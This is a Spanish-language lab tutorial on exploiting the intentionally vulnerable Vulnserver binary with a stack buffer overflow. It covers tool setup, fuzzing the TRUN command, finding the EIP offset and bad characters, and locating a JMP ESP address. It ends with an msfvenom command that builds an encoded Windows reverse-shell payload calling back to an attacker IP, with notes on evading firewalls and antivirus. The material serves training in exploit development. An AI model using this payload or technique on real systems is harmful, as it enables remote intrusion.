# **Metodología de análisis de vulnerabilidades y explotación**

En este trabajo nos adentraremos inicialmente en cómo generar un ambiente para poder explotar vulnerabilidades en archivos binarios. Como es una introducción, comenzaremos con el "setup" o instalación de las herramientas necesarias y luego utilizaremos una máquina o servidor que contiene el binario con ciertas vulnerabilidades. Si bien es posible que este tipo de vulnerabilidades no se encuentren en un ambiente productivo, sí es importante comenzar por lo básico para poder ir ganando experiencia y luego dar el salto hacia casos de mayor complejidad.

Por otro lado, considero importante dar una pequeña descripción de dos palabras que seguramente utilizaremos más adelante pero que sería bueno definirlas de manera temprana para poder estar en la misma página.

<ins>Fuzzing:</ins> como podemos ver en el manual, voy a citar textual, *"el fuzzing es una técnica que consiste en proporcionar entradas masivas y generalmente aleatorias a un programa o componente, con el objetivo de detectar fallos inesperados. La idea detrás del fuzzing es simple pero poderosa: si se inyectan suficientes datos, tarde o temprano se activará algún comportamiento no previsto por el desarrollador, y eso podría revelar la existencia de una vulnerabilidad"*.

<ins>Ingeniería inversa</ins>: como podemos ver en el manual, voy a citar textual, *"La ingeniería inversa, en el ámbito de la ciberseguridad, consiste en descomponer y analizar el comportamiento interno de un software, elemento o sistema con el fin de comprender su lógica, descubrir errores de diseño o implementación, identificar posibles vulnerabilidades, e incluso manipular su comportamiento. Su uso es especialmente relevante cuando el código fuente no está disponible, lo que obliga al analista a estudiar directamente el binario ejecutable, combinando técnicas de análisis estático y dinámico. Con el primero se inspecciona el binario, identificando funciones, estructuras, rutas de ejecución y patrones sospechosos. Mientras que con el segundo se ejecuta el programa en un entorno controlado y se observa su comportamiento en tiempo real utilizando debuggers y depuradores. La combinación de ambos análisis lo que permite es comprender cómo se comporta el software ante determinadas entradas, cómo gestiona la memoria y qué validaciones aplica o no aplica. La ingeniería inversa, como se ha mencionado, no se limita a entender cómo funciona un programa. También es una técnica muy eficaz para descubrir fallos de seguridad, especialmente cuando se parte de una hipótesis razonable o de un input que provoca un comportamiento anómalo. Siguiendo la propagación de una variable, inspeccionando el contenido de los registros o analizando qué funciones se invocan a partir de una entrada concreta, es posible detectar condiciones peligrosas como saltos condicionales manipulables, llamadas a funciones inseguras o errores lógicos críticos."*.

## Guía de instalación

<ins>Setup</ins>

Utilizaremos el siguiente arsenal de herramientas:

- Immunity Debugger
- Mona
- Ida
- Server Vulnerable
- Python
- Nmap
- Visual Studio Code

Para facilitar la instalación lo realizaré en un ambiente Windows pero las herramientas mencionadas también pueden utilizarse sobre ambiente Linux.

### Paso a paso y explicación de cada herramienta

<ins>Server vulnerable:</ins> este es un binario que ha sido diseñado para ser vulnerable, el cual se puede explotar. Para descargarlo, puedes ir a [descargar vuln_server](https://github.com/stephenbradshaw/vulnserver).

(captura de pantalla)
<img width="1219" height="520" alt="Vuln_server_download" src="https://github.com/user-attachments/assets/8fae2958-16b2-405a-b752-c0bd71f9b83c" />

<ins>Python 3 para Windows:</ins> descargaremos el instalador que nos será útil también para la instalación de Immunity Debugger. Para descargarlo, te dejo la ruta al instalador x64: [Pinchar aquí](https://www.python.org/ftp/python/3.13.9/python-3.13.9-amd64.exe).

Luego agregas el "path" y le dices "install now"!!

<img width="645" height="399" alt="Python 1" src="https://github.com/user-attachments/assets/0673499a-19b1-4339-a4ae-6edd25a5169e" />

<ins>Immunity Debugger:</ins> esta herramienta analiza el binario para poder encontrar vulnerabilidades (hace debugging) y luego explotar la misma. Para descargarlo, puedes ir a [Descarga](https://github.com/kbandla/ImmunityDebugger/releases).

<img width="1022" height="394" alt="Immunity download" src="https://github.com/user-attachments/assets/b4386ccc-78ee-4577-9a08-9b4425ea2456" />

La instalación la comienzas aceptando el acuerdo y al darle instalar comienza a extraer los archivos necesarios para comenzar la instalación.

<img width="416" height="282" alt="Immu 1" src="https://github.com/user-attachments/assets/84555402-04a0-4796-9e45-df50d6f65514" />

Luego, te preguntará si deseas instalar Python 2.7, puedes decirle que sí por si luego deseas probar algunos scripts en Python 2 también. Al finalizar, deberías tener el programa instalado y buscarlo en tus nuevas instalaciones. Al ejecutarlo se ve así:

<img width="1913" height="1032" alt="Immu 2" src="https://github.com/user-attachments/assets/666bc87d-b852-45cc-ab33-a88d4cb345e5" />

<ins>IDA:</ins> También es un debugger pero tiene un apartado para ver un pseudocódigo de lo que es el ensamblador. Con esta herramienta podemos efectuar ingeniería inversa. Para descargarlo, puedes ir a [Descarga](https://github.com/TheMalwareGuardian/Exploit-the-Binary/blob/main/Installers/mona-master-x64dbg.zip).

Luego de descomprimirlo, lo ejecutamos y seguimos los pasos (siguiente, siguiente) hasta finalizar su instalación. Al abrirlo ejecutamos "new file":

<img width="393" height="353" alt="ida1" src="https://github.com/user-attachments/assets/495b013e-77c1-48e8-9521-61b7f1df41be" />

Allí iremos a buscar nuestro binario vulnerable:

<img width="772" height="537" alt="ida2" src="https://github.com/user-attachments/assets/61bd9b4b-23ef-418d-babb-2243120c371f" />

Aceptamos:

<img width="734" height="550" alt="ida3" src="https://github.com/user-attachments/assets/35bc7bd3-31dc-4bfc-81ac-b3ef0719b5ad" />

Y por último, veremos las funciones del lado izquierdo y del derecho el ensamblador (luego lo veremos en la explotación más adelante):

<img width="1191" height="698" alt="ida4" src="https://github.com/user-attachments/assets/cf439c45-8bb8-4673-8e74-da5e6028bcdc" />

<ins>Mona:</ins> esta es una herramienta que podemos importar en Immunity para facilitarnos la explotación en el binario. Para descargarlo, puedes ir a [Descarga](https://github.com/TheMalwareGuardian/Exploit-the-Binary/blob/main/Installers/mona-master-corelan.zip).

Al descargarlo y descomprimirlo, veremos lo siguiente:

<img width="523" height="246" alt="mona 1" src="https://github.com/user-attachments/assets/976a8124-5930-4ed0-a7a6-979047a8ab74" />

Ya podemos observar que ese .py de Python ha sido reconocido porque previamente lo instalamos. Ese mismo archivo debemos copiarlo dentro del siguiente folder "C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands\" para que luego desde Immunity nos permita ejecutarlo.

<img width="1150" height="1011" alt="mona 2" src="https://github.com/user-attachments/assets/03aba7b8-0ea3-4bf8-9f0c-9305e67cf91c" />

Como podemos observar en la imagen previa, ejecutamos "!mona" y nos reconoce el comando.

<ins>Nmap para Windows:</ins> esto nos permitirá consultar al servidor vulnerable que estará escuchando las conexiones entrantes al puerto 9999 con el ncat (más allá de poder usar nmap para ver qué puertos tiene abiertos un destino). Lo podemos descargar de [aquí](https://nmap.org/dist/nmap-7.98-setup.exe).

Seleccionamos "npcap" dentro de las opciones (si no viene instalado) y luego es por defecto, siguiente y siguiente hasta terminar la instalación.

Aquí ya vemos cómo quedó instalado (luego usaremos el comando para generar una consulta al server vulnerable):

<img width="639" height="247" alt="ncat" src="https://github.com/user-attachments/assets/e42a5327-dd07-4b11-876a-32e04a739113" />

<ins>Visual Studio Code:</ins> esta herramienta nos permitirá ver código y también scripts de Python y demás. Para descargarlo para Windows, haz clic [aquí](https://code.visualstudio.com/sha/download?build=stable&os=win32-x64-user).

Es sencilla la instalación, apretamos siguiente e instalar.

<img width="592" height="457" alt="vscode1" src="https://github.com/user-attachments/assets/2e399a0b-f211-4d28-a81d-329ea1baeb8a" />

Luego vamos a abrir la carpeta en donde descargaremos scripts.

<img width="553" height="461" alt="vscode2" src="https://github.com/user-attachments/assets/5aca876f-c1f9-4405-a2d5-12d01012aa5f" />
<img width="378" height="268" alt="imagen" src="https://github.com/user-attachments/assets/4acff24e-e0a1-4930-89f4-7788170afd1f" />

## Explotación

Vamos a comenzar descargando dos scripts que nos permitirán conectarnos al server vulnerable y luego hacer fuzzing y evidenciar cómo podemos lograr colgar el servidor, dado que inicialmente conocemos una de sus vulnerabilidades para efectuar un buffer overflow. Luego de efectuar esto, haremos el paso a paso de cómo sería con Immunity y demás herramientas, acercándonos a una prueba en un ambiente más real donde habitualmente no tendríamos el código fuente para analizarlo y deberíamos utilizar estas herramientas y analizar pseudocódigo.

1. Vamos a ejecutar el binario para levantar el servicio. Para ello, primero, voy a dejar una captura de mi folder con todo dentro para que sirva de guía. Cada uno tendrá el "Path" que haya elegido para efectuar este paso a paso.

<img width="260" height="236" alt="herramientas" src="https://github.com/user-attachments/assets/71ed126c-9409-4a3d-a7c5-238f9cb48a12" />

Ahora sí, abrimos una línea de comando (cmd) y ejecutamos el binario:

<img width="904" height="287" alt="vulnserver" src="https://github.com/user-attachments/assets/2341d8eb-49a5-4b8c-b427-39bcd8e46bcc" />

2. Con el servicio levantado, vamos a descargarnos dos scripts en Python. Puedes descargarlos desde [aquí](https://github.com/TheMalwareGuardian/Exploit-the-Binary/tree/main/Vulnerable%20Binaries/Windows/01%20Vulnserver/Methodology%20%26%20Exploitation/01%20Stack%20Buffer%20Overflow/Exploit): descarga solo los marcados en rojo.

<img width="1214" height="514" alt="descarga de scripts" src="https://github.com/user-attachments/assets/2a622776-7d32-43cb-9337-fe2c00e79308" />

Veamos con Visual Studio Code el primer script, el de conexión:

<img width="898" height="466" alt="script 1" src="https://github.com/user-attachments/assets/a0214cb3-b9e5-40ab-a713-738442eb04d7" />

Claramente vemos cómo el script se conectará al server (en este caso es la IP 127.0.0.1 que es la propia IP de uno o el propio localhost) y enviará el comando "Help".

Ejecutémoslo y vemos la salida exitosa:

<img width="1524" height="985" alt="script1-2" src="https://github.com/user-attachments/assets/482093b2-f77d-4b29-9a4e-d68af9bcbf83" />

Lo mismo podemos hacer desde una terminal CMD con el ncat que nos bajamos antes!!

<img width="890" height="552" alt="script1-3" src="https://github.com/user-attachments/assets/53031175-ced4-4420-80ae-754a8cba4bdc" />

Finalmente, pasemos al segundo script que es el de fuzzing:

<img width="744" height="352" alt="script2" src="https://github.com/user-attachments/assets/acdcc5e8-6212-41e3-b7b2-cd313f78af41" />

En el script podemos ver que se van a insertar varios parámetros (en este caso caracteres "A" incrementando el número) a la entrada del parámetro TRUN.

Vamos a ejecutarlo y ver cómo cuelga al programa, haciendo que este en un momento deje de responder!!!

<img width="1512" height="776" alt="script2-1" src="https://github.com/user-attachments/assets/323396a6-e066-4833-95f0-64f300071edc" />
<img width="798" height="380" alt="script2-2" src="https://github.com/user-attachments/assets/ff24346b-8c23-4a01-80dd-e36b7c9348d0" />

3. Abrimos Immunity Debugger como admin (con nuestro server corriendo)

Allí abrimos nuestro binario vulnerable:

<img width="1411" height="747" alt="Immunity 1" src="https://github.com/user-attachments/assets/8dd88786-77d6-4ef3-9916-bf1fe0e72318" />

Ver que hay que darle "Play" en la imagen de arriba, sino abre el binario en pausa.

Ahora, corremos el script 2 nuevamente que es el de Fuzzing (el mismo que antes hizo crashear el programa) y veamos como Immunity muestra el crash, también se pausa porque justamente el programa colgó y muestra los caracteres "A" enviados.

<img width="1362" height="763" alt="Immunity 2" src="https://github.com/user-attachments/assets/a4cb6d75-b12e-42d7-82ae-6d0aa3366ce7" />

Otras de las cosas importantes a analizar (nosotros porque tenemos el código pero sino hay que verlo con IDA en el pseudo código) o ver es que rompe no por enviarle solo caracteres "A" sino porque éstos vienen después de un "." punto, si ese punto no estuviese al comienzo no nos crashearía. Esto no es porque siempre que pongamos un punto va a funcionar sino porque la función del código está efectuada así en el binario.

<img width="611" height="398" alt="Immunity 3" src="https://github.com/user-attachments/assets/cdbe3827-cb11-4342-8c3f-f49b783caf2f" />

Cuando se envía el comando TRUN al servidor, para que entre por la función vulnerable necesita ese punto que vemos en la imagen de abajo del código.

<img width="721" height="379" alt="binario 1" src="https://github.com/user-attachments/assets/66fe1f94-377d-4502-b1ac-61a5fa22c13c" />

Ahora vamos a bajar los otros scripts para las otras fases y vamos a configurar Mona para que guarde los logs que genere en una carpeta específica

Paso nuevamente el link para bajar los scripts y debajo en la imagen muestro cuales serían: [descargar](https://github.com/TheMalwareGuardian/Exploit-the-Binary/tree/main/Vulnerable%20Binaries/Windows/01%20Vulnserver/Methodology%20%26%20Exploitation/01%20Stack%20Buffer%20Overflow/Exploit).

<img width="1104" height="625" alt="script 3" src="https://github.com/user-attachments/assets/1240f0cc-a901-427d-9bc1-c267eebba2f0" />

Ahora configuraremos Mona dentro de Immunity para guardar sus logs (cada uno puede poner la ruta que desee), el comando es:

!mona config -set workingfolder C:\Users\Mariano\Documents\Master Cybersecurity\Modulo 6\Vulnerability\Mona\logs\%p

<img width="831" height="412" alt="mona 3" src="https://github.com/user-attachments/assets/fc58b9f3-56ee-4349-b127-a49cf6e7831e" />

El EIP es la dirección de memoria a la que va a retornar el programa, es importante saber la longitud. Hay varias maneras de ejecutar un comando con mona para poder saber esta longitud de EIP (es lo que justo queremos sobreescribir por demás de lo soportado para generar el buffer overflow).
Para hacerlo lo haremos desde Immunity, donde podemos ver el valor de EIP 

<img width="1212" height="652" alt="Immunity 4" src="https://github.com/user-attachments/assets/f3a13b76-b319-4067-90a9-855ddca68504" />

Vamos a ejecutar el script 3 y luego de crashear, vamos a ejecutar: !mona pattern_offset 'valor_EIP'; es decir !mona pattern_offset 396F4338

<img width="694" height="458" alt="mona 4" src="https://github.com/user-attachments/assets/91bc16e2-3700-423f-aeb3-4f660f9d5293" />

Como vimos en la imagen previa, busco el patrón y lo encontró en la posición 2006. Es decir, podemos enviar 2006 caracteres "A" y después 4 "b", viendo que 2006 es la longitud hasta sobreescribir el EIP.

Antes de pasar al script 4, mostraremos el tercero que ejecutamos previamente:

<img width="1591" height="724" alt="script 3 run" src="https://github.com/user-attachments/assets/89c7b3c0-4533-41e7-b3a1-a835fdc73ee4" />

Ahora comprobaremos lo que mencionamos arriba, justamente enviar 2006 "A" y luego 4 "B" para sobreescribir el EIP. Iniciamos nuevamente el servicio que estaba pausado debido al crash:

<img width="1918" height="1035" alt="Immunity 5" src="https://github.com/user-attachments/assets/b6f4a9a0-255a-47f9-84a9-8a61d85e4c4b" />

Ejecutamos el Script 4:

<img width="1585" height="750" alt="Script 4" src="https://github.com/user-attachments/assets/b9dcb3bc-0c1f-431a-8eb6-57a256d7bf6d" />

Vemos el EIP con las 4 "b" (42424242) 

<img width="1353" height="698" alt="script 4-1" src="https://github.com/user-attachments/assets/2a45e7a6-9205-4e34-96bb-0ddbdb2d225f" />

Si tomamos el valor del tope de la pila (ESP en Immunity) y apretamos botón derecho y le decimos "follow in dump" podremos ver en la pila
La pila es la región de memoria que sirve para hacer un seguimiento de como va la ejecución del programa en cuestión.

<img width="1167" height="547" alt="script 4-2" src="https://github.com/user-attachments/assets/acb0f3bf-a3bd-4fba-b680-07496717a1f2" />

<img width="1731" height="880" alt="script 4-3" src="https://github.com/user-attachments/assets/0cc39413-7c66-4f3a-aece-38bc000ec585" />

Sigamos!!!
Ahora vamos a usar !mona modules para ver las dll que está importando el binario a fin de reconocer si la explotación es viable o no, dado que tendremos que encontrar una dirección de memoria en donde exista un salto a la ESP.

<img width="1888" height="550" alt="mona modules" src="https://github.com/user-attachments/assets/986c4c27-21c7-483e-9960-107bea8963b9" />

Como vemos en la imagen de arriba, usaremos esa dll que tiene en "false" ciertas protecciones.

Ahora ejecutaremos el siguiente comando: "mona jmp -r esp"

<img width="1837" height="471" alt="mona 5" src="https://github.com/user-attachments/assets/32208f23-d3f5-4279-8828-62fe822fb9a3" />

Aquí podemos ver direcciones de memoria en las que hay una instrucción hacia ESP (ver la dll essfunc.dll, ésta vamos a usarla para la explotación)

Pasemos al otro paso, que es enviar "bad chars" y para esto correremos el script número 5:

<img width="1248" height="709" alt="script 5" src="https://github.com/user-attachments/assets/a8075795-d817-4f6f-bbc6-5e6f73ce8c0c" />

Así como enviamos 4 "B", podríamos enviar "C" u otra convinación, o mismo caracteres malos o no admitidos que paren la ejecución de lo que sigue.
Luego de ejecutar el script 5, hacemos un follow the dump del ESP y vemos que luego de las "A" y 4 "B", tenemos un 00

<img width="1901" height="819" alt="script 5-1" src="https://github.com/user-attachments/assets/20bc849d-a3bb-427e-a9eb-893add94c0d4" />

Samos que el 00 será efectivo, pero como podemos automatizar esto para ver que otros lo son? Para ello usaremos mona con un array. El comando es "!mona bytearray". Esto es importante para poder saber que caracteres nulos NO debemos incluir.

<img width="1152" height="356" alt="mona 6" src="https://github.com/user-attachments/assets/68724f43-056e-4c07-be30-589fe704ec7b" />

Importante sacar esos caracteres nulos para que no se corte lo que estaremos enviado. Es decir, si hay un caracter nulo como ser 00 y luego enviamos 4 "C", esas 4 no van a aparecer. Por eso necesitamos sacarlas.

Cuando sabemos cuales no debemos incluir, volvermos a correr el binario en Immunity y volver a las direcciones en donde haya un salto a la ESP. 
Utilizaremos nuevamente el comando !mona jmp -r esp así tomamos uno de los resultados que tenga salto hacia la pila ESP (0x625011c7)

<img width="1244" height="409" alt="script 6" src="https://github.com/user-attachments/assets/30479c0d-99da-4ae7-80f5-4ac82acf43be" />

Luego en Immunity hacemos botón derecho sobre el cuadrante izquierdo superior y elejimos "go to> expression".

<img width="1320" height="778" alt="script 6-1" src="https://github.com/user-attachments/assets/9be9195c-0bd4-4388-b8a1-3830ac312668" />
<img width="1021" height="481" alt="script 6-2" src="https://github.com/user-attachments/assets/2371e45c-bb1d-48c1-a666-26cb40276f4d" />

Ahí vemos justamente el mismo valor, la misma dirección de memoria previa, que buscamos el cual tiene un jump o salto hacia el ESP

<img width="1194" height="609" alt="script 6-3" src="https://github.com/user-attachments/assets/c779be90-600d-4d96-96c2-9270e74ec8f4" />

Por lo tanto, si en vez de enviar las 2006 "A" + las 4 "B" para sobreescribir la EIP pusiésemos el valor anterior (se pone de atrás hacia adelante, es decir, NO "625011c7" sino "c7115062") 

Ejecutemos el script 6:

<img width="1118" height="842" alt="script 6 run" src="https://github.com/user-attachments/assets/f516b9e1-c45c-4f85-8c90-24a557abde5f" />

Vemos que luego de las "A" en vez de tener "B" tenemos la instrucción mencionada arriba, 115062.

<img width="1217" height="705" alt="script 6-4" src="https://github.com/user-attachments/assets/adfdad91-6a55-4d7d-8e59-7cb710cac534" />

Seguimos evidenciando, aparecen previamente los NOPs porque fue así configurado el script y nuevamente la secuencia de AF115062 (endian format)

<img width="1793" height="842" alt="script 6-5" src="https://github.com/user-attachments/assets/65aa85e0-5954-4ced-88b5-ec0921ad8a20" />

Vamos al último paso, el de poder explotar la vulnerabilidad. Para esto nos vamos a crear nuestro Shell code con Kali (si uno no quiero hacer esto, simplemente se puede armar su script de Python copiando o descargando el mismo y listo).

Ingresamos a Kali y ejecutamos: "msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.49 LPORT=443 EXITFUNC=thread --bad-chars "\x00" -e x86/shikata_ga_nai --format python"

<img width="1163" height="679" alt="Kali1" src="https://github.com/user-attachments/assets/ab729ddf-757b-4847-9bd5-15e574fec745" />

Explicación del comando: El comando genera un payload (carga útil) en formato Python que, al ejecutarse en un sistema Windows objetivo, establece una conexión de shell inverso (reverse shell) hacia la máquina del atacante (Kali Linux, en caso de no tener ejecutarlo en otro linux con la IP de ese sistema operativo). Esto permite al atacante obtener una sesión de comandos (cmd.exe) en el sistema destino.

a. **`msfvenom`**: comando de Metasploit para generar payloads personalizados.  
b. **`-p windows/shell_reverse_tcp`**: especifica el payload a generar; un shell inverso para sistemas Windows que se conecta al atacante a través de TCP.  
c. **`LHOST=192.168.1.49`**: esta IP es la del Kali en mi caso, aquí es donde el payload, cuando se ejecute en el destino, intentará conectarse para darme el reverse shell.  
d. **`LPORT=443`**: el puerto en la máquina del atacante donde se espera la conexión. El puerto 443 (HTTPS) se usa porque el tráfico en este puerto puede pasar desapercibido en redes con firewalls.  
e. **`EXITFUNC=thread`**: indica que el payload se ejecuta como un hilo en el proceso objetivo. Si el payload termina, el hilo se cierra sin afectar el proceso principal, mejorando la estabilidad y evitando detección.  
f. **`--bad-chars "\x00"`**: excluye el byte nulo (`\x00`) del payload, ya que puede romper cadenas de texto o causar errores en la ejecución.  
g. **`-e x86/shikata_ga_nai`**: usa el codificador `shikata_ga_nai` para ofuscar el payload, haciéndolo más difícil de detectar por antivirus. Este codificador es polimórfico y funciona en arquitecturas x86 (32 bits).  
h. **`--format python`**: genera el payload como un script Python (array de bytes), ideal para integrarlo en scripts o ejecutarlo en sistemas con Python instalado.

## Descargar el script

Haz clic en el enlace para descargar el script principal:

[Descargar script.py](imagenes/07Shell_code.py)
